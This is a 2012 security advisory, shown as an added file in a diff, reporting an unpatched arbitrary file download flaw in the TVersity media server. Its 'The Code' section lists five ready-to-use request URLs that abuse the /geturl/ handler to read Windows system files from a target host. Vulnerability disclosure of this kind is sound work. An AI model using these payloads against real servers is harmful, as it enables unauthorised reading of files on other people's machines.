@@ -1,0 +1,74 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  TVersity
+              http://tversity.com
+Versions:     <= 1.9.7
+Platforms:    Windows
+Bug:          arbitrary files downloading
+Exploitation: remote
+Date:         14 Mar 2012
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+TVersity is an home media server.
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+Possibility of downloading arbitrary files.
+
+Note that TVersity is intended for an home usage and by default it
+shouldn't accept connections from internet (there is a specific option
+for that), anyway I have not verified.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://SERVER:41952/geturl/.%3ftype%3daudio%252fmpeg%26url%3dfile://c:/windows/&ext=system.ini
+http://SERVER:41952/geturl/%2e?type=audio/mpeg&url=file://c:/windows/&ext=system.ini
+http://SERVER:41952/geturl/%2e?type=audio/mpeg&url=file://c:/windows/system.ini&ext=.
+http://SERVER:41952/geturl/system.ini.ini?type=audio/mpeg&url=file://c:/windows/&ext=.ini
+http://SERVER:41952/geturl/c:\windows\system.ini.mp3?type=audio/mpeg&url=file://&ext=.ini
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix.
+
+
+#######################################################################
